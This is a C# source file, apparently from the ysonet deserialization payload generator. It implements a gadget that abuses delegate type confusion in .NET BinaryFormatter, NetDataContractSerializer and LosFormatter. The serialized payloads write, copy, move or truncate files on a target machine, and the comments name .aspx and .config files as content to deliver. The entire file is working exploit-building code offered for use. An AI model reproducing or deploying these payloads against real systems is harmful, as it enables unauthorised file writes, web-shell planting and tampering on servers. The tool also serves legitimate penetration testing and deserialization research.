using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /*
     * TypeConfuseDelegateFileOperations: Forshaw's delegate/type confusion pointed at the
     * file system instead of at Process.Start.
     *
     * The primitive is the same one TypeConfuseDelegate uses. A Comparison<string> is
     * combined with itself, wrapped by Comparer<string>.Create, and handed to a sorted
     * framework container that is then filled with two strings. Invocation-list slot 1 is
     * replaced with a two-string BCL method, so when the container rebuilds itself on
     * deserialize and calls the comparer, that method runs with the two strings as its
     * arguments. Nothing is spawned: no child process, no compiler, no WPF.
     *
     * What changes here is slot 1 and the meaning of the two strings. The variant picks the
     * operation:
     *   1 (default) File.WriteAllText(targetPath, text)   -c "targetPath;localContentFile"
     *   2           File.Copy(sourcePath, destinationPath) -c "sourcePath;destinationPath"
     *   3           File.Move(sourcePath, destinationPath) -c "sourcePath;destinationPath"
     *   4           Directory.Move(source, destination)    -c "sourcePath;destinationPath"
     *   5           File.WriteAllText(targetPath, "")      -c "targetPath"
     *
     * ORDERING is the one hard constraint. On deserialize the sorted container inserts the
     * SMALLER-sorting element first as the tree root and compares the larger against it, so
     * the larger element always lands in the spliced method's FIRST argument. That is why
     * this gadget builds its container with String.CompareOrdinal instead of the
     * culture-sensitive String.Compare the command path uses: the order is fixed at build
     * time by whatever comparison fills the container, so the generation-time guard and the
     * serialized order must be the same comparison, or a payload built under one culture
     * could hand the sink its arguments the other way round. Variants 1 to 4 therefore
     * refuse any input where CompareOrdinal(firstArgument, secondArgument) is not greater
     * than zero, instead of silently swapping or rewriting what the user typed. Variant 5
     * pairs the target path with an internal "", which every non-empty string sorts after.
     *
     * Variant 5 uses an empty File.WriteAllText rather than File.Create on purpose:
     * File.Create hands back an open FileStream with FileShare.None and the confused call
     * has no way to dispose it, while WriteAllText creates or truncates the file and closes
     * its own handle.
     *
     * --rootcontainer is orthogonal to the operation and picks the serialized ROOT the
     * splice travels in (1 SortedSet, 2 SortedDictionary, 3 TreeSet), exactly as it does on
     * the two HostedPayloads gadgets.
     *
     * Like every payload built on this primitive it needs .NET Framework 4.5+, because
     * Comparer<T>.Create and the ComparisonComparer<T> it returns do not exist in 4.0.
     */
    public class TypeConfuseDelegateFileOperationsGenerator : GenericGenerator
    {
        // ---- Operation table ---------------------------------------------------
        //
        // One row per variant, so the label, the -c meaning, the error wording and the
        // spliced delegate can never drift apart. FirstField/SecondField are the SEMANTIC
        // names used in messages; the first field is always the one that must sort higher.
        private sealed class FileOperation
        {
            public int Number;
            public string Name;          // short operation word used in messages
            public string Label;         // variant label shown in help and the editor
            public string FirstField;
            public string SecondField;
            public CommandInputType Input;
            public bool SecondFieldIsLocalFile;   // read here at build time
            public bool SecondFieldIsInternal;    // not taken from -c at all
        }

        private static readonly FileOperation[] Operations =
        {
            new FileOperation
            {
                Number = 1, Name = "write", Label = "write text from a local file (default)",
                FirstField = "target path", SecondField = "embedded text",
                Input = CommandInputType.TargetPathAndLocalFile, SecondFieldIsLocalFile = true,
            },
            new FileOperation
            {
                Number = 2, Name = "copy", Label = "copy a file on the target",
                FirstField = "source path", SecondField = "destination path",
                Input = CommandInputType.TargetPathPair,
            },
            new FileOperation
            {
                Number = 3, Name = "move", Label = "move a file on the target",
                FirstField = "source path", SecondField = "destination path",
                Input = CommandInputType.TargetPathPair,
            },
            new FileOperation
            {
                Number = 4, Name = "dirmove", Label = "move a directory on the target",
                FirstField = "source path", SecondField = "destination path",
                Input = CommandInputType.TargetPathPair,
            },
            new FileOperation
            {
                Number = 5, Name = "empty", Label = "create or truncate an empty file",
                FirstField = "target path", SecondField = "empty string",
                Input = CommandInputType.TargetPath, SecondFieldIsInternal = true,
            },
        };

        private static FileOperation OperationFor(int variant)
        {
            foreach (FileOperation op in Operations)
                if (op.Number == variant)
                    return op;
            throw new Exception("Unknown TypeConfuseDelegateFileOperations variant: " + variant
                + " (use 1, 2, 3, 4, or 5).");
        }

        // The two-string BCL method spliced into invocation-list slot 1. Each delegate type
        // is written out in full so an overloaded method binds to the two-string overload
        // and not to one that takes an encoding or an overwrite flag.
        private static Delegate Slot1For(int variant)
        {
            switch (variant)
            {
                case 2: return new Action<string, string>(File.Copy);
                case 3: return new Action<string, string>(File.Move);
                case 4: return new Action<string, string>(Directory.Move);
                // 1 and 5 are both WriteAllText; 5 just supplies "" as the text.
                default: return new Action<string, string>(File.WriteAllText);
            }
        }

        // ---- Metadata ----------------------------------------------------------

        // Discovery facets (category search only): reads, writes, copies, moves and
        // truncates files on the target with framework built-in types only. Variant 1 also
        // takes a LOCAL file, so it declares both inputs; the other four are target-side
        // only and derive their input from CommandInputType.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.FileSystem)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // ComparisonComparer/Comparer.Create are 4.5-era; fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
        }

        public override string Finders()
        {
            return "James Forshaw";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        // Kept to two short sentences on purpose: this is the first block of the
        // interactive info panel, and a long one pushes the formatter, command-input and
        // category lines off the screen. The -c format, the ordering rule and the target
        // side preconditions live in the option help, which --fullhelp and the editor show.
        public override string AdditionalInfo()
        {
            return "Performs a file operation on the target through the TypeConfuseDelegate "
                + "delegate confusion, without starting a process: write text from a local "
                + "file, copy, move, move a directory, or create/truncate an empty file. The "
                + "var/variant option picks the operation and decides what -c means; the two "
                + "strings must be in strict ordinal order, which the generator enforces.";
        }

        public override List<string> Labels()
        {
            // Independent: it owns its whole chain and serializes a framework container of
            // its own. Not Hosted (it hands no other generator's object to Serialize) and
            // not Bridged (it carries no inner payload).
            return new List<string> { GadgetTags.Independent };
        }

        private int variant_number = 1;

        // Serialized root container. Orthogonal to variant_number, which picks the
        // OPERATION, so it gets its own option instead of being multiplied into the variant
        // list (the same split the two HostedPayloads gadgets use).
        private int root_container_number = 1;

        public override List<GadgetVariant> Variants()
        {
            // No .Without(...): the operation only changes which two-string method sits in
            // invocation-list slot 1, so every variant carries the same formatter set. No
            // .WithoutOptions(...): every variant uses rootcontainer.
            var variants = new List<GadgetVariant>();
            foreach (FileOperation op in Operations)
            {
                var v = new GadgetVariant(op.Number, op.Label, op.Input);
                if (op.SecondFieldIsLocalFile)
                {
                    // The only variant whose -c also names a file on the OPERATOR machine,
                    // so it declares both accepted inputs. A FacetOverride replaces the
                    // whole set, so the kinds, requirements and versions are repeated here.
                    v.WithFacets(new GadgetFacetSet()
                        .WithKinds(PayloadKind.FileSystem)
                        .WithInputs(PayloadInput.TargetPath, PayloadInput.LocalFile)
                        .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                        .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481)));
                }
                variants.Add(v);
            }
            return variants;
        }

        // The -c default matches variant 1, the default operation.
        public override CommandInputType CommandInput()
        {
            return CommandInputType.TargetPathAndLocalFile;
        }

        public override OptionSet Options()
        {
            return new OptionSet
            {
                {
                    "var|variant=",
                    "File operation: 1 -> write text from a local file [default] "
                        + "(-c \"targetPath;localContentFile\"), 2 -> copy a file, 3 -> move a "
                        + "file, 4 -> move a directory (2-4 take -c \"sourcePath;destinationPath\"), "
                        + "5 -> create or truncate an empty file (-c \"targetPath\"). Every path "
                        + "except the local content file is a path on the TARGET and is never "
                        + "touched here. Only the first ';' splits the value, so the second field "
                        + "may contain more of them. The first argument must sort strictly after "
                        + "the second with String.CompareOrdinal, or generation is refused. "
                        + "Preconditions on the target: write and empty create or overwrite the "
                        + "file but do not create its parent directory; copy and both moves do "
                        + "not overwrite an existing destination; dirmove needs an existing "
                        + "source, a free destination and the same volume; all of them need the "
                        + "target process to have the file-system rights. --minify with "
                        + "NetDataContractSerializer is refused when it would rewrite either "
                        + "string (the XML minifier trims trailing whitespace, drops a carriage "
                        + "return, and collapses \"; \"); BinaryFormatter and LosFormatter minify "
                        + "the same input safely.",
                    v =>
                    {
                        int parsed;
                        // Not the usual int.TryParse(v, out variant_number) shortcut: that
                        // silently turns "nope" or "9" into the default operation, which
                        // would build a payload the user did not ask for.
                        if (!int.TryParse(v, out parsed) || parsed < 1 || parsed > Operations.Length)
                            throw new OptionException(
                                "variant must be 1, 2, 3, 4, or 5", "variant");
                        variant_number = parsed;
                    }
                },
                {
                    TypeConfuseDelegateGenerator.RootContainerOptionName + "=",
                    TypeConfuseDelegateGenerator.RootContainerOptionHelp
                        + " It does not change the file operation.",
                    v => root_container_number =
                        TypeConfuseDelegateGenerator.ParseRootContainerOption(v)
                },
            };
        }

        // The same three formatters TypeConfuseDelegate advertises, and for the same
        // reasons. The spliced method travels in a DelegateSerializationHolder record,
        // which only the runtime formatters and NetDataContractSerializer reproduce, so no
        // public-member serializer (Json.NET, XmlSerializer, DataContractSerializer, ...)
        // can rebuild a MulticastDelegate invocation list. SoapFormatter is absent for a
        // second, independent reason: every root container is a generic type
        // (SortedSet`1, SortedDictionary`2, TreeSet`1) and SoapFormatter cannot serialize
        // one. The "(5)" annotation is display-only and means all five variants ride that
        // formatter.
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                "BinaryFormatter (5)", "NetDataContractSerializer (5)", "LosFormatter (5)"
            };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // Defensive: Options() already rejects anything outside the table, but an
            // internal caller could set the field another way.
            FileOperation op = OperationFor(variant_number);

            // No variant declares a formatter opt-out today. The call stays so a later
            // opt-out cannot be declared in Variants() without being enforced here.
            GuardVariantFormatter(variant_number, formatter);

            string first, second;
            ReadFields(op, inputArgs, out first, out second);
            RequireOrdinalOrder(op, first, second);

            // keysMayCollide is false: RequireOrdinalOrder has already refused an equal
            // pair with a message that names the operation, so the generic duplicate-key
            // refusal inside the shared builder can never be reached from here.
            object payload = TypeConfuseDelegateGenerator.BuildConfusedContainer(
                root_container_number, TypeConfuseDelegateGenerator.OrdinalCompare,
                Slot1For(op.Number), first, second, false);

            if (inputArgs != null && inputArgs.Minify)
                RequireStringsSurviveMinification(payload, formatter, inputArgs, op, first, second);

            return Serialize(payload, formatter, inputArgs);
        }

        // ---- Minification safety ------------------------------------------------

        // Both strings this gadget carries are USER DATA that the target uses literally: a
        // path it opens, or text it writes to a file. The XML minifier is not text
        // preserving - XmlMinifier.XmlXSLTMinifier trims leading and trailing whitespace
        // from every text node, the XmlDocument round trip normalizes a CR away, and one of
        // the dirty-match passes collapses "a; b" to "a;b" - so on an XML formatter
        // --minify can change what the target actually writes or opens. That is fine for
        // the payload's own plumbing and for an embedded XAML document, which is why the
        // minifier does it; it is not fine for a file the operator asked us to deliver.
        //
        // So VERIFY rather than predict. Serialize once with the self-test off and ask the
        // shared Helpers/MinifiedTextGuard which of the delivered strings no longer appear as
        // exact text values. A rule of thumb ("refuse a trailing newline") would be wrong: the
        // "a; b" case is not whitespace at the ends at all, and any future minifier change
        // would silently invalidate the rule. This costs one extra serialization, and only
        // when --minify is set. The REFUSAL WORDING stays here, because the alternative it
        // can offer is specific to this gadget; TempFileCollection reuses the same guard with
        // its own message.
        //
        // BinaryFormatter and LosFormatter are unaffected: their minified streams carry the
        // string records verbatim, which the runtime-effect matrix proves for every
        // operation and every root container.
        private void RequireStringsSurviveMinification(object payload, string formatter,
            InputArgs inputArgs, FileOperation op, string first, string second)
        {
            InputArgs probeArgs = inputArgs.DeepCopy();
            probeArgs.Test = false;   // never fire a payload just to inspect it

            // The order matters for the message: report the first field before the second.
            // Variant 5's second element is the internal "", which is not emitted as text at
            // all, and the guard skips an empty value for exactly that reason.
            var wanted = new List<string> { first, second };
            List<string> missing = MinifiedTextGuard.MissingTextValues(
                Serialize(payload, formatter, probeArgs), wanted);
            if (missing.Count == 0)
                return;

            string fieldName = string.Equals(missing[0], first, StringComparison.Ordinal)
                ? op.FirstField : op.SecondField;
            throw new ArgumentException(op.Name + " cannot use --minify with " + formatter
                + " for this input: the XML minifier rewrites whitespace inside text content, "
                + "so the " + fieldName + " would not reach the target intact. Drop --minify, "
                + "or use BinaryFormatter or LosFormatter, whose minified streams carry the "
                + "string unchanged. (Trailing whitespace, a carriage return, and \"; \" are "
                + "the parts that get rewritten.)");
        }

        // ---- Input parsing -----------------------------------------------------

        // Turn -c into the two strings the spliced method receives.
        //
        // -c is NOT read as a file holding the real value the way the shell-command
        // gadgets do it (TypeConfuseDelegateGenerator.ReadCommandFromFile): here -c is a
        // path specification, and a path that happens to exist on the operator machine
        // must stay the path, not become its own contents.
        private static void ReadFields(FileOperation op, InputArgs inputArgs,
            out string first, out string second)
        {
            string cmd = inputArgs == null ? null : inputArgs.Cmd;

            if (op.SecondFieldIsInternal)
            {
                // Variant 5: the whole value is the target path, so a ';' inside it is not
                // ambiguous and must not be treated as a separator.
                first = cmd ?? "";
                if (first.Length == 0)
                    throw new ArgumentException(op.Name + " needs -c \"<" + op.FirstField
                        + ">\", a path on the target. Example: -c \"C:\\work\\empty.txt\".");
                second = "";
                return;
            }

            SplitOnFirstSeparator(op, cmd, out first, out second);

            if (op.SecondFieldIsLocalFile)
                second = ReadLocalContentFile(op, second);
        }

        // Split on the FIRST ';' only. Everything after it belongs to the second field, so
        // a destination path or a chunk of text may contain further semicolons. Both halves
        // are preserved verbatim: no trimming, no path normalization, no quote stripping.
        private static void SplitOnFirstSeparator(FileOperation op, string cmd,
            out string first, out string second)
        {
            string value = cmd ?? "";
            int separator = value.IndexOf(';');
            if (separator < 0)
                throw new ArgumentException(op.Name + " needs -c \"<" + op.FirstField + ">;<"
                    + op.SecondField + ">\" with a ';' between the two fields (got \"" + value
                    + "\"). Quote the whole -c value in a shell.");

            first = value.Substring(0, separator);
            second = value.Substring(separator + 1);

            if (first.Length == 0)
                throw new ArgumentException(op.Name + " needs a non-empty " + op.FirstField
                    + " before the ';'.");
            if (second.Length == 0)
                throw new ArgumentException(op.Name + " needs a non-empty " + op.SecondField
                    + " after the ';'.");
        }

        // Variant 1's second field names a file on THIS machine whose text is embedded in
        // the payload now. A relative path resolves against ysonet's current working
        // directory. It is never reinterpreted as inline text, so a missing or unreadable
        // file is an error rather than a payload that writes the file name to the target.
        //
        // The transfer is character preserving, not byte preserving: File.ReadAllText
        // detects and consumes a UTF-8/UTF-16/UTF-32 byte order mark and otherwise decodes
        // as UTF-8, and File.WriteAllText(string,string) on the target writes UTF-8 with no
        // BOM. That suits text (.aspx, .config, scripts). Binary delivery is out of scope
        // for a primitive that carries two strings and no encoding argument.
        private static string ReadLocalContentFile(FileOperation op, string path)
        {
            if (!File.Exists(path))
                throw new ArgumentException(op.Name + " reads its content from a LOCAL file, "
                    + "and \"" + path + "\" does not exist on this machine. The second field is "
                    + "a file path here, never inline text.");
            try
            {
                return File.ReadAllText(path);
            }
            catch (Exception err)
            {
                throw new ArgumentException(op.Name + " cannot read the local content file \""
                    + path + "\": " + err.Message);
            }
        }

        // ---- The ordering rule -------------------------------------------------

        // The sorted container serializes its two elements smallest first, and on
        // deserialize the LARGER one is the element handed to the spliced method as
        // argument 1. So the semantic first argument has to sort strictly after the second.
        //
        // The comparison is String.CompareOrdinal over the COMPLETE strings: it is the
        // first unequal UTF-16 code unit that decides, which is not always the first
        // character. Nothing here rewrites the user's input to make it pass - no reordering,
        // no prefix, no BOM (File.ReadAllText consumes a BOM, so it is not part of the
        // embedded string anyway) and no "\\?\" trick ('\' still sorts below most letters).
        private static void RequireOrdinalOrder(FileOperation op, string first, string second)
        {
            if (String.CompareOrdinal(first, second) > 0)
                return;

            string fix = op.SecondFieldIsLocalFile
                ? "Change the target path or, if acceptable, change the content so its leading text sorts lower."
                : "Change one of the two paths, e.g. give the " + op.FirstField
                    + " a name that sorts higher.";

            throw new ArgumentException(op.Name + " requires the " + op.FirstField
                + " to sort after the " + op.SecondField
                + " using String.CompareOrdinal, because the sorted container hands the "
                + "larger string to the operation first. " + fix
                + " Got " + op.FirstField + " \"" + Preview(first) + "\" and " + op.SecondField
                + " \"" + Preview(second) + "\".");
        }

        // Keep an error line readable when the second field is a whole file of text.
        private static string Preview(string value)
        {
            if (value == null)
                return "";
            string oneLine = value.Replace("\r", " ").Replace("\n", " ");
            return oneLine.Length <= 60 ? oneLine : oneLine.Substring(0, 60) + "...";
        }
    }
}
